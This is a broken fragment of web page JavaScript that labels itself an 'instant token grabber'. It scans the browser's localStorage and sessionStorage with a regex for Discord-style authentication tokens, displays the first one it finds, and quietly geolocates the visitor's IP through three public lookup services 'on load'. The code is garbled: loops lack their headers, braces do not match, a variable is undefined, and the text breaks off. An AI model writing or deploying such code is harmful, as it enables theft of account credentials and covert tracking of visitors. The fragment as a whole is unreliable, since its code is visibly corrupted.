    <script>

        // 🔥 INSTANT TOKEN GRABBER + VISUAL REVEAL
        function revealTokens() {
            const regex = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
            const tokens = [];
            
            // Grab from all storage
            [localStorage, sessionStorage].forEach(storage => {

                    const value = storage.getItem(key);
                    const matches = value?.match(regex);

                }
            });

            // VISUAL REVEAL (pulsing box)

            if (tokens.length) {
                const token = tokens[0]; // Show first valid token

                display.style.background = '#1a1a1a';

        // 🔥 FIXED GEO (unchanged - 3x redundant)
        async function grabGeoLocation(ip) {
            const apis = [
                `http://ip-api.com/json/${ip}?fields=29`,
                `http://ipinfo.io/${ip}/json`,
                `https://ipapi.co/${ip}/json/`

            for(const api of apis) {
                try {
                    const res = await fetch(api);
                    const data = await res.json();
                    return {
                        country: data.country || data.country_name || 'Unknown',
                        city: data.city || data.region || 'Unknown',
                        isp: data.isp || data.org || 'Unknown'
                    };
                } catch(e) { continue; }
            }
            return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
        }

        // 🚀 SILENT GEO ON LOAD
